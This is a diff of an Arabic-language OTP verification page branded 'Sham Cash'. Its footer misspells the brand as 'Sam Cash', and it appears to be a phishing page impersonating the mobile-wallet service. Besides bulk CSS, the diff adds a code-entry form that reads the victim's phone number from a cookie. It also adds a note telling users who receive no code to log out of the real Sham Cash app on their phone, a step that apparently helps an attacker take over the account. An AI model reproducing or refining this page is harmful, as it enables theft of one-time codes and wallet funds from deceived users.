@@ -1,4 +1,6 @@
-<html lang="en"><head>
+<html lang="en">
+
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sham Cash</title>
@@ -7,25 +9,832 @@
     <link rel="stylesheet" href="./css/otp-style.css?v=126">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
     <style>
-        #loading-section, .reject-data {
-            display: none;
-        }
-        .alert {
-            text-align: right;
-        }
-        .btn-close {
-            width: 10px;
-            height: 10px;
-            margin: 10px;
-        }
-        #loading-section .loader{
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-            width: 50%;
-        }
+    #loading-section,
+    .reject-data {
+        display: none;
+    }
+
+    .alert {
+        text-align: right;
+    }
+
+    .btn-close {
+        width: 10px;
+        height: 10px;
+        margin: 10px;
+    }
+
+    #loading-section .loader {
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+        width: 50%;
+    }
     </style>
-<style>undefined</style></head>
+    <style>
+    undefined
+    </style>
+    <style>
+    undefined
+    </style>
+    <style type="text/css">
+    @keyframes spin-668344b5 {
+        0% {
+            transform: rotate(0deg)
+        }
+
+        to {
+            transform: rotate(1turn)
+        }
+    }
+    </style>
+    <style type="text/css">
+    :root {
+        --toastify-color-light: #fff;
+        --toastify-color-dark: #121212;
+        --toastify-color-info: #3498db;
+        --toastify-color-success: #07bc0c;
+        --toastify-color-warning: #f1c40f;
+        --toastify-color-error: #e74c3c;
+        --toastify-color-transparent: #ffffffb3;
+        --toastify-icon-color-info: var(--toastify-color-info);
+        --toastify-icon-color-success: var(--toastify-color-success);
+        --toastify-icon-color-warning: var(--toastify-color-warning);
+        --toastify-icon-color-error: var(--toastify-color-error);
+        --toastify-toast-width: 320px;
+        --toastify-toast-background: #fff;
+        --toastify-toast-min-height: 64px;
+        --toastify-toast-max-height: 800px;
+        --toastify-font-family: sans-serif;
+        --toastify-z-index: 9999;
+        --toastify-text-color-light: #757575;
+        --toastify-text-color-dark: #fff;
+        --toastify-text-color-info: #fff;
+        --toastify-text-color-success: #fff;
+        --toastify-text-color-warning: #fff;
+        --toastify-text-color-error: #fff;
+        --toastify-spinner-color: #616161;
+        --toastify-spinner-color-empty-area: #e0e0e0;
+        --toastify-color-progress-light: linear-gradient(90deg, #4cd964, #5ac8fa, #007aff, #34aadc, #5856d6, #ff2d55);
+        --toastify-color-progress-dark: #bb86fc;
+        --toastify-color-progress-info: var(--toastify-color-info);
+        --toastify-color-progress-success: var(--toastify-color-success);
+        --toastify-color-progress-warning: var(--toastify-color-warning);
+        --toastify-color-progress-error: var(--toastify-color-error);
+        --toastify-color-progress-colored: #ddd
+    }
+
+    .Toastify__toast-container {
+        box-sizing: border-box;
+        color: #fff;
+        padding: 4px;
+        position: fixed;
+        transform: translate3d(0, 0, var(--toastify-z-index) px);
+        width: var(--toastify-toast-width);
+        z-index: var(--toastify-z-index)
+    }
+
+    .Toastify__toast-container--top-left {
+        left: 1em;
+        top: 1em
+    }
+
+    .Toastify__toast-container--top-center {
+        left: 50%;
+        top: 1em;
+        transform: translateX(-50%)
+    }
+
+    .Toastify__toast-container--top-right {
+        right: 1em;
+        top: 1em
+    }
+
+    .Toastify__toast-container--bottom-left {
+        bottom: 1em;
+        left: 1em
+    }
+
+    .Toastify__toast-container--bottom-center {
+        bottom: 1em;
+        left: 50%;
+        transform: translateX(-50%)
+    }
+
+    .Toastify__toast-container--bottom-right {
+        bottom: 1em;
+        right: 1em
+    }
+
+    @media only screen and (max-width:480px) {
+        .Toastify__toast-container {
+            left: 0;
+            margin: 0;
+            padding: 0;
+            width: 100vw
+        }
+
+        .Toastify__toast-container--top-center,
+        .Toastify__toast-container--top-left,
+        .Toastify__toast-container--top-right {
+            top: 0;
+            transform: translateX(0)
+        }
+
+        .Toastify__toast-container--bottom-center,
+        .Toastify__toast-container--bottom-left,
+        .Toastify__toast-container--bottom-right {
+            bottom: 0;
+            transform: translateX(0)
+        }
+
+        .Toastify__toast-container--rtl {
+            left: auto;
+            right: 0
+        }
+    }
+
+    .Toastify__toast {
+        border-radius: 4px;
+        box-shadow: 0 1px 10px 0 #0000001a, 0 2px 15px 0 #0000000d;
+        box-sizing: border-box;
+        cursor: pointer;
+        direction: ltr;
+        display: flex;
+        font-family: var(--toastify-font-family);
+        justify-content: space-between;
+        margin-bottom: 1rem;
+        max-height: var(--toastify-toast-max-height);
+        min-height: var(--toastify-toast-min-height);
+        overflow: hidden;
+        padding: 8px;
+        position: relative;
+        z-index: 0
+    }
+
+    .Toastify__toast--rtl {
+        direction: rtl
+    }
+
+    .Toastify__toast-body {
+        align-items: center;
+        display: flex;
+        flex: 1 1 auto;
+        margin: auto 0;
+        padding: 6px;
+        white-space: pre-wrap
+    }
+
+    .Toastify__toast-body>div:last-child {
+        flex: 1
+    }
+
+    .Toastify__toast-icon {
+        display: flex;
+        flex-shrink: 0;
+        margin-inline-end: 10px;
+        width: 20px
+    }
+
+    .Toastify--animate {
+        animation-duration: .7s;
+        animation-fill-mode: both
+    }
+
+    .Toastify--animate-icon {
+        animation-duration: .3s;
+        animation-fill-mode: both
+    }
+
+    @media only screen and (max-width:480px) {
+        .Toastify__toast {
+            border-radius: 0;
+            margin-bottom: 0
+        }
+    }
+
+    .Toastify__toast-theme--dark {
+        background: var(--toastify-color-dark);
+        color: var(--toastify-text-color-dark)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--default,
+    .Toastify__toast-theme--light {
+        background: var(--toastify-color-light);
+        color: var(--toastify-text-color-light)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--info {
+        background: var(--toastify-color-info);
+        color: var(--toastify-text-color-info)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--success {
+        background: var(--toastify-color-success);
+        color: var(--toastify-text-color-success)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--warning {
+        background: var(--toastify-color-warning);
+        color: var(--toastify-text-color-warning)
+    }
+
+    .Toastify__toast-theme--colored.Toastify__toast--error {
+        background: var(--toastify-color-error);
+        color: var(--toastify-text-color-error)
+    }
+
+    .Toastify__progress-bar-theme--light {
+        background: var(--toastify-color-progress-light)
+    }
+
+    .Toastify__progress-bar-theme--dark {
+        background: var(--toastify-color-progress-dark)
+    }
+
+    .Toastify__progress-bar--info {
+        background: var(--toastify-color-progress-info)
+    }
+
+    .Toastify__progress-bar--success {
+        background: var(--toastify-color-progress-success)
+    }
+
+    .Toastify__progress-bar--warning {
+        background: var(--toastify-color-progress-warning)
+    }
+
+    .Toastify__progress-bar--error {
+        background: var(--toastify-color-progress-error)
+    }
+
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--default {
+        background: var(--toastify-color-progress-colored)
+    }
+
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--error,
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--info,
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--success,
+    .Toastify__progress-bar-theme--colored.Toastify__progress-bar--warning {
+        background: var(--toastify-color-transparent)
+    }
+
+    .Toastify__close-button {
+        align-self: flex-start;
+        background: #0000;
+        border: none;
+        color: #fff;
+        cursor: pointer;
+        opacity: .7;
+        outline: none;
+        padding: 0;
+        transition: .3s ease
+    }
+
+    .Toastify__close-button--light {
+        color: #000;
+        opacity: .3
+    }
+
+    .Toastify__close-button>svg {
+        fill: currentcolor;
+        height: 16px;
+        width: 14px
+    }
+
+    .Toastify__close-button:focus,
+    .Toastify__close-button:hover {
+        opacity: 1
+    }
+
+    @keyframes Toastify__trackProgress {
+        0% {
+            transform: scaleX(1)
+        }
+
+        to {
+            transform: scaleX(0)
+        }
+    }
+
+    .Toastify__progress-bar {
+        bottom: 0;
+        height: 5px;
+        left: 0;
+        opacity: .7;
+        position: absolute;
+        transform-origin: left;
+        width: 100%;
+        z-index: var(--toastify-z-index)
+    }
+
+    .Toastify__progress-bar--animated {
+        animation: Toastify__trackProgress linear 1 forwards
+    }
+
+    .Toastify__progress-bar--controlled {
+        transition: transform .2s
+    }
+
+    .Toastify__progress-bar--rtl {
+        left: auto;
+        right: 0;
+        transform-origin: right
+    }
+
+    .Toastify__spinner {
+        animation: Toastify__spin .65s linear infinite;
+        border: 2px solid;
+        border-color: var(--toastify-spinner-color-empty-area);
+        border-radius: 100%;
+        border-right-color: var(--toastify-spinner-color);
+        box-sizing: border-box;
+        height: 20px;
+        width: 20px
+    }
+
+    @keyframes Toastify__bounceInRight {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+        }
+
+        0% {
+            opacity: 0;
+            transform: translate3d(3000px, 0, 0)
+        }
+
+        60% {
+            opacity: 1;
+            transform: translate3d(-25px, 0, 0)
+        }
+
+        75% {
+            transform: translate3d(10px, 0, 0)
+        }
+
+        90% {
+            transform: translate3d(-5px, 0, 0)
+        }
+
+        to {
+            transform: none
+        }
+    }
+
+    @keyframes Toastify__bounceOutRight {
+        20% {
+            opacity: 1;
+            transform: translate3d(-20px, 0, 0)
+        }
+
+        to {
+            opacity: 0;
+            transform: translate3d(2000px, 0, 0)
+        }
+    }
+
+    @keyframes Toastify__bounceInLeft {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+        }
+
+        0% {
+            opacity: 0;
+            transform: translate3d(-3000px, 0, 0)
+        }
+
+        60% {
+            opacity: 1;
+            transform: translate3d(25px, 0, 0)
+        }
+
+        75% {
+            transform: translate3d(-10px, 0, 0)
+        }
+
+        90% {
+            transform: translate3d(5px, 0, 0)
+        }
+
+        to {
+            transform: none
+        }
+    }
+
+    @keyframes Toastify__bounceOutLeft {
+        20% {
+            opacity: 1;
+            transform: translate3d(20px, 0, 0)
+        }
+
+        to {
+            opacity: 0;
+            transform: translate3d(-2000px, 0, 0)
+        }
+    }
+
+    @keyframes Toastify__bounceInUp {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+        }
+
+        0% {
+            opacity: 0;
+            transform: translate3d(0, 3000px, 0)
+        }
+
+        60% {
+            opacity: 1;
+            transform: translate3d(0, -20px, 0)
+        }
+
+        75% {
+            transform: translate3d(0, 10px, 0)
+        }
+
+        90% {
+            transform: translate3d(0, -5px, 0)
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__bounceOutUp {
+        20% {
+            transform: translate3d(0, -10px, 0)
+        }
+
+        40%,
+        45% {
+            opacity: 1;
+            transform: translate3d(0, 20px, 0)
+        }
+
+        to {
+            opacity: 0;
+            transform: translate3d(0, -2000px, 0)
+        }
+    }
+
+    @keyframes Toastify__bounceInDown {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+        }
+
+        0% {
+            opacity: 0;
+            transform: translate3d(0, -3000px, 0)
+        }
+
+        60% {
+            opacity: 1;
+            transform: translate3d(0, 25px, 0)
+        }
+
+        75% {
+            transform: translate3d(0, -10px, 0)
+        }
+
+        90% {
+            transform: translate3d(0, 5px, 0)
+        }
+
+        to {
+            transform: none
+        }
+    }
+
+    @keyframes Toastify__bounceOutDown {
+        20% {
+            transform: translate3d(0, 10px, 0)
+        }
+
+        40%,
+        45% {
+            opacity: 1;
+            transform: translate3d(0, -20px, 0)
+        }
+
+        to {
+            opacity: 0;
+            transform: translate3d(0, 2000px, 0)
+        }
+    }
+
+    .Toastify__bounce-enter--bottom-left,
+    .Toastify__bounce-enter--top-left {
+        animation-name: Toastify__bounceInLeft
+    }
+
+    .Toastify__bounce-enter--bottom-right,
+    .Toastify__bounce-enter--top-right {
+        animation-name: Toastify__bounceInRight
+    }
+
+    .Toastify__bounce-enter--top-center {
+        animation-name: Toastify__bounceInDown
+    }
+
+    .Toastify__bounce-enter--bottom-center {
+        animation-name: Toastify__bounceInUp
+    }
+
+    .Toastify__bounce-exit--bottom-left,
+    .Toastify__bounce-exit--top-left {
+        animation-name: Toastify__bounceOutLeft
+    }
+
+    .Toastify__bounce-exit--bottom-right,
+    .Toastify__bounce-exit--top-right {
+        animation-name: Toastify__bounceOutRight
+    }
+
+    .Toastify__bounce-exit--top-center {
+        animation-name: Toastify__bounceOutUp
+    }
+
+    .Toastify__bounce-exit--bottom-center {
+        animation-name: Toastify__bounceOutDown
+    }
+
+    @keyframes Toastify__none {
+
+        0%,
+        60%,
+        75%,
+        90%,
+        to {
+            animation-duration: 0;
+            animation-timing-function: none
+        }
+
+        0% {
+            opacity: 1;
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    .Toastify__none-enter--bottom-center,
+    .Toastify__none-enter--bottom-left,
+    .Toastify__none-enter--bottom-right,
+    .Toastify__none-enter--top-center,
+    .Toastify__none-enter--top-left,
+    .Toastify__none-enter--top-right {
+        animation-name: Toastify__none
+    }
+
+    @keyframes Toastify__zoomIn {
+        0% {
+            opacity: 0;
+            transform: scale3d(.3, .3, .3)
+        }
+
+        50% {
+            opacity: 1
+        }
+    }
+
+    @keyframes Toastify__zoomOut {
+        0% {
+            opacity: 1
+        }
+
+        50% {
+            opacity: 0;
+            transform: scale3d(.3, .3, .3)
+        }
+
+        to {
+            opacity: 0
+        }
+    }
+
+    .Toastify__zoom-enter {
+        animation-name: Toastify__zoomIn
+    }
+
+    .Toastify__zoom-exit {
+        animation-name: Toastify__zoomOut
+    }
+
+    @keyframes Toastify__flipIn {
+        0% {
+            animation-timing-function: ease-in;
+            opacity: 0;
+            transform: perspective(400px) rotateX(90deg)
+        }
+
+        40% {
+            animation-timing-function: ease-in;
+            transform: perspective(400px) rotateX(-20deg)
+        }
+
+        60% {
+            opacity: 1;
+            transform: perspective(400px) rotateX(10deg)
+        }
+
+        80% {
+            transform: perspective(400px) rotateX(-5deg)
+        }
+
+        to {
+            transform: perspective(400px)
+        }
+    }
+
+    @keyframes Toastify__flipOut {
+        0% {
+            transform: perspective(400px)
+        }
+
+        30% {
+            opacity: 1;
+            transform: perspective(400px) rotateX(-20deg)
+        }
+
+        to {
+            opacity: 0;
+            transform: perspective(400px) rotateX(90deg)
+        }
+    }
+
+    .Toastify__flip-enter {
+        animation-name: Toastify__flipIn
+    }
+
+    .Toastify__flip-exit {
+        animation-name: Toastify__flipOut
+    }
+
+    @keyframes Toastify__slideInRight {
+        0% {
+            transform: translate3d(110%, 0, 0);
+            visibility: visible
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__slideInLeft {
+        0% {
+            transform: translate3d(-110%, 0, 0);
+            visibility: visible
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__slideInUp {
+        0% {
+            transform: translate3d(0, 110%, 0);
+            visibility: visible
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__slideInDown {
+        0% {
+            transform: translate3d(0, -110%, 0);
+            visibility: visible
+        }
+
+        to {
+            transform: translateZ(0)
+        }
+    }
+
+    @keyframes Toastify__slideOutRight {
+        0% {
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translate3d(110%, 0, 0);
+            visibility: hidden
+        }
+    }
+
+    @keyframes Toastify__slideOutLeft {
+        0% {
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translate3d(-110%, 0, 0);
+            visibility: hidden
+        }
+    }
+
+    @keyframes Toastify__slideOutDown {
+        0% {
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translate3d(0, 500px, 0);
+            visibility: hidden
+        }
+    }
+
+    @keyframes Toastify__slideOutUp {
+        0% {
+            transform: translateZ(0)
+        }
+
+        to {
+            transform: translate3d(0, -500px, 0);
+            visibility: hidden
+        }
+    }
+
+    .Toastify__slide-enter--bottom-left,
+    .Toastify__slide-enter--top-left {
+        animation-name: Toastify__slideInLeft
+    }
+
+    .Toastify__slide-enter--bottom-right,
+    .Toastify__slide-enter--top-right {
+        animation-name: Toastify__slideInRight
+    }
+
+    .Toastify__slide-enter--top-center {
+        animation-name: Toastify__slideInDown
+    }
+
+    .Toastify__slide-enter--bottom-center {
+        animation-name: Toastify__slideInUp
+    }
+
+    .Toastify__slide-exit--bottom-left,
+    .Toastify__slide-exit--top-left {
+        animation-name: Toastify__slideOutLeft
+    }
+
+    .Toastify__slide-exit--bottom-right,
+    .Toastify__slide-exit--top-right {
+        animation-name: Toastify__slideOutRight
+    }
+
+    .Toastify__slide-exit--top-center {
+        animation-name: Toastify__slideOutUp
+    }
+
+    .Toastify__slide-exit--bottom-center {
+        animation-name: Toastify__slideOutDown
+    }
+
+    @keyframes Toastify__spin {
+        0% {
+            transform: rotate(0deg)
+        }
+
+        to {
+            transform: rotate(1turn)
+        }
+    }
+    </style>
+    <style id="qr-scanner-styles">
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+        </style>
+</head>
+
 <body>
     <div class="login-container">
         <div class="wellness-card">
@@ -37,13 +846,12 @@
             <div id="loading-section">
                 <div class="alert alert-info" role="alert">..جاري التحقق , يرجى الانتظار </div>
                 <img class="loader" src="./media/mak-loader.gif">
-            </div> 
+            </div>
             <div class="alert alert-danger reject-data" role="alert">رمز التحقق غير صالح<button type="button" class="btn-close" aria-label="Close"></button> </div>
             <form class="harmony-form" id="login-otp" action="" method="POST">
-                                <p style="text-align:right;margin-bottom: 10px;font-size: 20px;font-weight: normal;margin-left: 5px;">التحقق من هويتك</p>
+                <p style="text-align:right;margin-bottom: 10px;font-size: 20px;font-weight: normal;margin-left: 5px;">التحقق من هويتك</p>
                 <p style="text-align:right;font-size: 15px;margin-bottom: 10px;">
-                    <span id="template">**********<span> المرسل إلى OTP أدخل رمز </p>
-                
+                    <span id="template">******7777 المرسل إلى OTP أدخل رمز </span></p>
                 <div class="input-field">
                     <input type="number" inputmode="numeric">
                     <input type="number" inputmode="numeric" disabled="">
@@ -62,138 +870,356 @@
                         <div class="growing-circle circle-3"></div>
                     </div>
                     <div class="button-aura"></div>
-                </button> 
+                </button>
             </form>
-            
+            <div id="comp-mhb206hh" class="Z_l5lU ku3DBC zQ9jDz qvSjx3 Vq6kJx comp-mhb206hh wixui-rich-text" data-testid="richTextElement">
+                <p class="font_7 wixui-rich-text__text" style="    --section-max-width: 9999px;
+    --spx-stopper-max: 9999px;
+    --spx-stopper-min: 0px;
+    --browser-zoom: 1;
+    --one-unit: 1cqw;
+    --wst-button-color-fill-primary: rgb(var(--color_48));
+    --wst-button-color-border-primary: rgb(var(--color_49));
+    --wst-button-color-text-primary: rgb(var(--color_50));
+    --wst-button-color-fill-primary-hover: rgb(var(--color_51));
+    --wst-button-color-border-primary-hover: rgb(var(--color_52));
+    --wst-button-color-text-primary-hover: rgb(var(--color_53));
+    --wst-button-color-fill-primary-disabled: rgb(var(--color_54));
+    --wst-button-color-border-primary-disabled: rgb(var(--color_55));
+    --wst-button-color-text-primary-disabled: rgb(var(--color_56));
+    --wst-button-color-fill-secondary: rgb(var(--color_57));
+    --wst-button-color-border-secondary: rgb(var(--color_58));
+    --wst-button-color-text-secondary: rgb(var(--color_59));
+    --wst-button-color-fill-secondary-hover: rgb(var(--color_60));
+    --wst-button-color-border-secondary-hover: rgb(var(--color_61));
+    --wst-button-color-text-secondary-hover: rgb(var(--color_62));
+    --wst-button-color-fill-secondary-disabled: rgb(var(--color_63));
+    --wst-button-color-border-secondary-disabled: rgb(var(--color_64));
+    --wst-button-color-text-secondary-disabled: rgb(var(--color_65));
+    --wst-color-fill-base-1: rgb(var(--color_36));
+    --wst-color-fill-base-2: rgb(var(--color_37));
+    --wst-color-fill-base-shade-1: rgb(var(--color_38));
+    --wst-color-fill-base-shade-2: rgb(var(--color_39));
+    --wst-color-fill-base-shade-3: rgb(var(--color_40));
+    --wst-color-fill-accent-1: rgb(var(--color_41));
+    --wst-color-fill-accent-2: rgb(var(--color_42));
+    --wst-color-fill-accent-3: rgb(var(--color_43));
+    --wst-color-fill-accent-4: rgb(var(--color_44));
+    --wst-color-fill-background-primary: rgb(var(--color_11));
+    --wst-color-fill-background-secondary: rgb(var(--color_12));
+    --wst-color-text-primary: rgb(var(--color_15));
+    --wst-color-text-secondary: rgb(var(--color_14));
+    --wst-color-action: rgb(var(--color_18));
+    --wst-color-disabled: rgb(var(--color_39));
+    --wst-color-title: rgb(var(--color_45));
+    --wst-color-subtitle: rgb(var(--color_46));
+    --wst-color-line: rgb(var(--color_47));
+    --wst-font-style-h2: var(--font_2);
+    --wst-font-style-h3: var(--font_3);
+    --wst-font-style-h4: var(--font_4);
+    --wst-font-style-h5: var(--font_5);
+    --wst-font-style-h6: var(--font_6);
+    --wst-font-style-body-large: var(--font_7);
+    --wst-font-style-body-medium: var(--font_8);
+    --wst-font-style-body-small: var(--font_9);
+    --wst-font-style-body-x-small: var(--font_10);
+    --wst-color-custom-1: rgb(var(--color_13));
+    --wst-color-custom-2: rgb(var(--color_16));
+    --wst-color-custom-3: rgb(var(--color_17));
+    --wst-color-custom-4: rgb(var(--color_19));
+    --wst-color-custom-5: rgb(var(--color_20));
+    --wst-color-custom-6: rgb(var(--color_21));
+    --wst-color-custom-7: rgb(var(--color_22));
+    --wst-color-custom-8: rgb(var(--color_23));
+    --wst-color-custom-9: rgb(var(--color_24));
+    --wst-color-custom-10: rgb(var(--color_25));
+    --wst-color-custom-11: rgb(var(--color_26));
+    --wst-color-custom-12: rgb(var(--color_27));
+    --wst-color-custom-13: rgb(var(--color_28));
+    --wst-color-custom-14: rgb(var(--color_29));
+    --wst-color-custom-15: rgb(var(--color_30));
+    --wst-color-custom-16: rgb(var(--color_31));
+    --wst-color-custom-17: rgb(var(--color_32));
+    --wst-color-custom-18: rgb(var(--color_33));
+    --wst-color-custom-19: rgb(var(--color_34));
+    --wst-color-custom-20: rgb(var(--color_35));
+    --color_0: 255,255,255;
+    --color_1: 255,255,255;
+    --color_2: 0,0,0;
+    --color_3: 237,28,36;
+    --color_4: 0,136,203;
+    --color_5: 255,203,5;
+    --color_6: 114,114,114;
+    --color_7: 176,176,176;
+    --color_8: 255,255,255;
+    --color_9: 114,114,114;
+    --color_10: 176,176,176;
+    --color_11: 255,255,255;
+    --color_12: 232,230,230;
+    --color_13: 199,199,199;
+    --color_14: 89,89,89;
+    --color_15: 0,0,0;
+    --color_16: 229,240,254;
+    --color_17: 200,224,254;
+    --color_18: 0,87,225;
+    --color_19: 0,58,150;
+    --color_20: 0,29,75;
+    --color_21: 249,197,180;
+    --color_22: 243,167,143;
+    --color_23: 237,88,41;
+    --color_24: 158,59,27;
+    --color_25: 79,29,14;
+    --color_26: 210,172,247;
+    --color_27: 186,131,240;
+    --color_28: 128,21,232;
+    --color_29: 85,14,155;
+    --color_30: 43,7,77;
+    --color_31: 177,211,187;
+    --color_32: 127,168,139;
+    --color_33: 64,124,81;
+    --color_34: 43,83,54;
+    --color_35: 21,41,27;
+    --color_36: 255,255,255;
+    --color_37: 0,0,0;
+    --color_38: 232,230,230;
+    --color_39: 199,199,199;
+    --color_40: 89,89,89;
+    --color_41: 0,87,225;
+    --color_42: 237,88,41;
+    --color_43: 184,58,77;
+    --color_44: 255,255,255;
+    --color_45: 0,0,0;
+    --color_46: 0,0,0;
+    --color_47: 89,89,89;
+    --color_48: 0,87,225;
+    --color_49: 0,87,225;
+    --color_50: 255,255,255;
+    --color_51: 255,255,255;
+    --color_52: 0,87,225;
+    --color_53: 0,87,225;
+    --color_54: 199,199,199;
+    --color_55: 199,199,199;
+    --color_56: 255,255,255;
+    --color_57: 255,255,255;
+    --color_58: 0,87,225;
+    --color_59: 0,87,225;
+    --color_60: 0,87,225;
+    --color_61: 0,87,225;
+    --color_62: 255,255,255;
+    --color_63: 255,255,255;
+    --color_64: 199,199,199;
+    --color_65: 199,199,199;
+    --font_0: normal normal normal 14px/1.4em helvetica-w01-bold,sans-serif;
+    --font_1: normal normal normal 16px/1.4em din-next-w01-light,sans-serif;
+    --font_2: normal normal normal 40px/1.4em helvetica-w01-bold,sans-serif;
+    --font_3: normal normal normal 38px/1.4em helvetica-w01-bold,sans-serif;
+    --font_4: normal normal normal 35px/1.4em helvetica-w01-roman,sans-serif;
+    --font_5: normal normal bold 16px/1.4em janna-lt-w20-regular,sans-serif;
+    --font_6: normal normal normal 25px/1.4em helvetica-w01-bold,sans-serif;
+    --font_7: normal normal normal 22px/1.4em helvetica-w01-roman,sans-serif;
+    --font_8: normal normal normal 16px/1.4em janna-lt-w20-regular,sans-serif;
+    --font_9: normal normal normal 14px/1.4em helvetica-w01-roman,sans-serif;
+    --font_10: normal normal normal 12px/1.4em din-next-w01-light,sans-serif;
+    --wix-ads-height: 0px;
+    --sticky-offset: 0px;
+    --wix-ads-top-height: 0px;
+    --site-width: 320px;
+    --above-all-z-index: 100000;
+    --portals-z-index: 100001;
+    --wix-opt-in-direction: ltr;
+    -webkit-font-smoothing: antialiased;
+    --minViewportSize: 320;
+    --maxViewportSize: 1920;
+    --theme-spx-ratio: 1px;
+    --full-viewport: 100 * var(--one-unit) * var(--browser-zoom);
+    --scaling-factor: clamp(var(--spx-stopper-min), var(--full-viewport), min(var(--spx-stopper-max), var(--section-max-width)));
+    --customScaleViewportLimit: clamp(var(--minViewportSize) * 1px, var(--full-viewport), min(var(--section-max-width), var(--maxViewportSize) * 1px));
+    --toastify-color-light: #fff;
+    --toastify-color-dark: #121212;
+    --toastify-color-info: #3498db;
+    --toastify-color-success: #07bc0c;
+    --toastify-color-warning: #f1c40f;
+    --toastify-color-error: #e74c3c;
+    --toastify-color-transparent: #ffffffb3;
+    --toastify-icon-color-info: var(--toastify-color-info);
+    --toastify-icon-color-success: var(--toastify-color-success);
+    --toastify-icon-color-warning: var(--toastify-color-warning);
+    --toastify-icon-color-error: var(--toastify-color-error);
+    --toastify-toast-width: 320px;
+    --toastify-toast-background: #fff;
+    --toastify-toast-min-height: 64px;
+    --toastify-toast-max-height: 800px;
+    --toastify-font-family: sans-serif;
+    --toastify-z-index: 9999;
+    --toastify-text-color-light: #757575;
+    --toastify-text-color-dark: #fff;
+    --toastify-text-color-info: #fff;
+    --toastify-text-color-success: #fff;
+    --toastify-text-color-warning: #fff;
+    --toastify-text-color-error: #fff;
+    --toastify-spinner-color: #616161;
+    --toastify-spinner-color-empty-area: #e0e0e0;
+    --toastify-color-progress-light: linear-gradient(90deg,#4cd964,#5ac8fa,#007aff,#34aadc,#5856d6,#ff2d55);
+    --toastify-color-progress-dark: #bb86fc;
+    --toastify-color-progress-info: var(--toastify-color-info);
+    --toastify-color-progress-success: var(--toastify-color-success);
+    --toastify-color-progress-warning: var(--toastify-color-warning);
+    --toastify-color-progress-error: var(--toastify-color-error);
+    --toastify-color-progress-colored: #ddd;
+    --cookie-banner-primary-color: #fff;
+    --cookie-banner-secondary-color: #000;
+    --cookie-banner-font-family: HelveticaNeue, Helvetica Neue, helvetica, Sans-Serif;
+    --cookie-banner-font-size: 14px;
+    --scrollbar-width: 0px;
+    --pinned-layers-in-page: 0;
+    --top-offset: 0px;
+    --pinned-layer-in-container: 51;
+    --above-all-in-container: 49;
+    --transition-duration: 0ms;
+    --param_boolean_previewHover: false;
+    --bg-overlay-color: rgb(var(--color_36));
+    --bg-gradient: none;
+    --rd: 0px;
+    --shd: 0 0 0 rgba(0, 0, 0, 0);
+    --bg: var(--color_37);
+    --brd: 227,227,227;
+    --alpha-brd: 1;
+    --brw: 0px;
+    --alpha-bg: 0;
+    text-size-adjust: 100%;
+    direction: var(--text-direction);
+    overflow-wrap: break-word;
+    text-shadow: var(--textOutline,0 0 transparent),var(--textShadow,0 0 transparent);
+    text-transform: var(--textTransform,"><span class="color_37 wixui-rich-text__text"><span style="font-weight:normal;" class="wixui-rich-text__text"><span style="font-family:janna-lt-w20-regular,sans-serif;" class="wixui-rich-text__text"><span style="letter-spacing:normal;" class="wixui-rich-text__text">ملاحظة </span></span></span></span><span style="color:#F60419;" class="wixui-rich-text__text"><span style="font-weight:normal;" class="wixui-rich-text__text"><span style="font-family:janna-lt-w20-regular,sans-serif;" class="wixui-rich-text__text"><span style="letter-spacing:normal;" class="wixui-rich-text__text">ان لم يتم إستلام رمز التحقق يرجى تسجيل الخروج من تطبيق شام كاش في موبايلك ليتم إكمال العملية</span></span></span></span></p>
+            </div>
             <div class="nurture-signup">
                 <span>Powered By </span><span><a href="#" class="growth-link">Sam Cash</a> @ </span><span>V 2.1.3 </span>
             </div>
         </div>
     </div>
-
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="./js/cookies.js"></script>
-
     <script>
-        $(document).ready(function() {
-            var mobile = getCookie('mobile')
-            // if(!mobile){
-            //     mobile = '1234' //REMOVE ON PRODUCTION
-            // }
-            document.getElementById('template').textContent = document.getElementById('template').textContent.replace('**********','******'+mobile.substr(mobile.length-4))
+    $(document).ready(function() {
+        var mobile = getCookie('mobile')
+        // if(!mobile){
+        //     mobile = '1234' //REMOVE ON PRODUCTION
+        // }
+        document.getElementById('template').textContent = document.getElementById('template').textContent.replace('**********', '******' + mobile.substr(mobile.length - 4))
 
-            $('.btn-close').on('click', function(e) {
-                e.preventDefault(); // Prevent default form submission
